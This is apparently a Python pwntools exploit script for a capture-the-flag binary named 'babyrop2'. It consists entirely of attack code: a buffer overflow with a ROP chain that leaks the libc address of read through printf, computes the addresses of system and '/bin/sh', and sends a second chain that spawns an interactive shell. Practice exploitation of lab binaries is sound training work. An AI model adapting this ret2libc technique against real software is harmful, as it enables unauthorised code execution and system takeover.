from pwn import *
p = process('./babyrop2')
#gdb.attach(p)
libc = ELF('./libc.so.6')
p.recvuntil("What's your name? ")
ret = p64(0x00000000004004d1)
read_got = p64(0x0000000000601020)
printf_plt = p64(0x00000000004004f0)
pop_rdi = p64(0x0000000000400733)
format = p64(0x400770)
pop_rsi_r15 = p64(0x0000000000400731)
main = p64(0x0000000000400540)
exp = "a"*40 + pop_rsi_r15 + read_got + p64(0) + pop_rdi + format + printf_plt + main
p.sendline(exp)
some = p.recvuntil("again, ")
some = p.recvuntil("again, ")
read_leak = u64(p.recvline()[0:6].strip() + "\x00\x00")
print hex(read_leak)
system = p64(read_leak - 789552)
binsh = p64(read_leak + 671274)
p.recvuntil("name? ")
exp2 = "a"*40 + ret + pop_rdi + binsh + system
p.sendline(exp2)
p.interactive()
